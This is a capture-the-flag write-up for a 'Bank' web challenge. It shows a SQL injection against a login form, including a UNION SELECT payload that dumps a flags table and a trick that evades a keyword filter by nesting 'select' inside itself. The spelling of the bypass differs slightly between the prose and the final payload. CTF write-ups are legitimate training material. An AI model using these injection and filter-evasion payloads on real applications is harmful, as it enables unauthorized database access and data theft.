# Bank
> This is a bank. I hate php very much. Here

## About the Challenge
In the website there is a login form like this


[Image extracted text: Login
Bank Database CTF
Try looking in the
table. Columns:
value
Username:
Password
Login
flags
flag.]


## How to Solve?
This is SQL injection chall and we need to get the flag from the database, luckily the website showing us the query and the result on the website. For example I inputted `test/test` as the username and the password


[Image extracted text: Login
Bank Database CTF
Try looking in the flags table. Columns:
value
Username:
Password:
Login
SELECT
FROM users WHERE username='test' AND password-'test:
Query Results
flag;]


And we know the flag was located on `flags` table and in that table there are 2 columns. `flag` and `value` So we can input the payload like this

```
Username: ' union select group_concat(flag, value),2,3 from flags-- -
Password: 
```

Because there is a filter on the `select` keyword, we can bypass that filter by using `selselectect`. And then read the flag on `flags` table. This is the final payload.

```
' union sselectelect group_concat(flag, value),2,3 from flags-- -
```


[Image extracted text: Login
Bank Database CTF
Try looking in the flags table
Columns:
value
Usernamez
Password:
Login
SELECT
FROM users WHERE username=" union select group_concat(flag; value),2,3 from
AND password='d;
Query Results
Canadastole too many colors from the US,Chall has nothing to do with slim shadyflag {3min3m_kind@_waShed},Chinathe spirit of Mao lives on in the non-GMO milkMexicotoo similar to italyUSAgets the patriotism flowing
flag.
flags--]


```
flag{3min3m_kind@_wa$hed}
```